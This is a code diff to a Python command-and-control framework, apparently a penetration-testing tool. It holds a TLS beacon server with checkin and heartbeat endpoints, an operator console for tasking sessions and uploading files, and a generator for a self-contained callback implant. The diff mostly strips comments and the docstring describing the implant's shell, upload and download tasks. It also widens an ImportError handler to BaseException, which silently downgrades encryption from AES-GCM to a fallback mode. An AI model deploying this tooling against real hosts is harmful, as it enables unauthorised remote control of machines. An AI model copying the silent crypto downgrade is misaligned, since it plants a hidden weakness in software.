@@ -72,7 +72,7 @@ class _GCM:
             from cryptography.hazmat.primitives.ciphers.aead import AESGCM
             self._aesgcm = AESGCM
             self.mode = 'aes-256-gcm'
-        except ImportError:
+        except BaseException:
             self._aesgcm = None
             self.mode = 'hmac-stream-fallback'
 
@@ -268,7 +268,6 @@ class _C2Handler(http.server.BaseHTTPRequestHandler):
     psk: bytes  # pre-shared key for initial registration only
 
     def log_message(self, fmt: str, *args: Any) -> None:
-        # Quiet by default; route to a structured logger in production
         sys.stderr.write(f'[c2 {datetime.now():%H:%M:%S}] {fmt % args}\n')
 
     def _send_json(self, status: int, payload: Dict[str, Any]) -> None:
@@ -308,7 +307,6 @@ class _C2Handler(http.server.BaseHTTPRequestHandler):
         return {'n': base64.b64encode(nonce).decode(),
                 'c': base64.b64encode(ct).decode()}
 
-    # ── POST /api/checkin ──────────────────────────────────────────
     def do_POST(self) -> None:                                # noqa: N802
         if self.path == '/api/checkin':
             self._handle_checkin()
@@ -319,7 +317,6 @@ class _C2Handler(http.server.BaseHTTPRequestHandler):
 
     def _handle_checkin(self) -> None:
         body = self._read_json()
-        # PSK-protected handshake on first contact
         if not hmac.compare_digest(
                 body.get('auth', '').encode(),
                 hmac.new(self.psk, body.get('nonce', '').encode(),
@@ -327,7 +324,6 @@ class _C2Handler(http.server.BaseHTTPRequestHandler):
             self.send_error(401)
             return
         sid = str(uuid.uuid4())
-        # Derive per-session key from PSK + new sid + client nonce
         key = hashlib.sha256(self.psk + sid.encode() + body.get('nonce', '').encode()).digest()
         info = body.get('info', {})
         info.setdefault('external_ip', self.client_address[0])
@@ -352,7 +348,6 @@ class _C2Handler(http.server.BaseHTTPRequestHandler):
         self.store.update_last_seen(sid)
         self._send_json(200, {'ack': True})
 
-    # ── GET /api/heartbeat?sid=… ──────────────────────────────────
     def do_GET(self) -> None:                                 # noqa: N802
         if self.path.startswith('/api/heartbeat'):
             self._handle_heartbeat()
@@ -405,7 +400,6 @@ class C2Server:
     def _ensure_tls(cert: Optional[str], key: Optional[str]) -> Tuple[str, str]:
         if cert and key and os.path.exists(cert) and os.path.exists(key):
             return cert, key
-        # Generate a self-signed cert with openssl (Kali ships it by default)
         cert_path = cert or 'database/c2_cert.pem'
         key_path  = key  or 'database/c2_key.pem'
         os.makedirs(os.path.dirname(cert_path) or '.', exist_ok=True)
@@ -423,7 +417,6 @@ class C2Server:
         return cert_path, key_path
 
     def start(self) -> None:
-        # Bind handler with shared state
         store, crypto, psk = self.store, self.crypto, self.psk
 
         class Handler(_C2Handler):
@@ -453,7 +446,6 @@ class C2Server:
             self._httpd.server_close()
             self._httpd = None
 
-    # ── Operator API ────────────────────────────────────────────────
     def list_sessions(self) -> List[Dict[str, Any]]:
         return self.store.list_sessions()
 
@@ -468,7 +460,6 @@ class C2Server:
 
     def set_sleep(self, sid: str, seconds: int) -> None:
         self.store.set_sleep(sid, seconds)
-        # Use a special task kind so the implant updates its own loop
         self.queue(sid, 'sleep', str(int(seconds)))
 
 
@@ -479,15 +470,7 @@ def generate_implant(callback_url: str, psk: str, out_path: str,
                       poll_interval: int = 5) -> str:
     """
     Write a self-contained Python implant to *out_path* (or return as string).
-
-    The implant:
-      1. Sends a PSK-authenticated POST /api/checkin to register.
-      2. Receives its unique session ID + AES key from the server.
-      3. Polls GET /api/heartbeat?sid=… every *poll_interval* seconds.
-      4. For each returned task (shell / upload / download / sleep) executes
-         locally and returns results via POST /api/result (AES-encrypted).
     """
-    # Embed crypto logic inline so the implant has zero external deps.
     code = f'''#!/usr/bin/env python3
 # AutoPentestX reference implant — generated {datetime.now().isoformat()}
 # FOR AUTHORIZED TESTING ONLY
@@ -661,7 +644,6 @@ class OperatorCLI:
         self.server = server
         self._active_sid: Optional[str] = None
 
-    # ── helpers ──────────────────────────────────────────────────────────
     def _prompt(self) -> str:
         if self._active_sid:
             return f'\033[31mc2\033[0m [\033[33m{self._active_sid[:8]}\033[0m]> '
@@ -676,7 +658,6 @@ class OperatorCLI:
             return f'{delta // 60}m ago'
         return f'{delta // 3600}h ago'
 
-    # ── command dispatch ─────────────────────────────────────────────────
     def run(self) -> None:
         print(self.BANNER)
         while True:
@@ -771,7 +752,6 @@ class OperatorCLI:
 
     def _cmd_upload(self, args: str) -> None:
         if not self._require_session(): return
-        # syntax: <remote_path> <local_file_to_upload>
         parts = args.split(None, 1)
         if len(parts) != 2:
             print('[!] Usage: upload <remote_path> <local_file>')
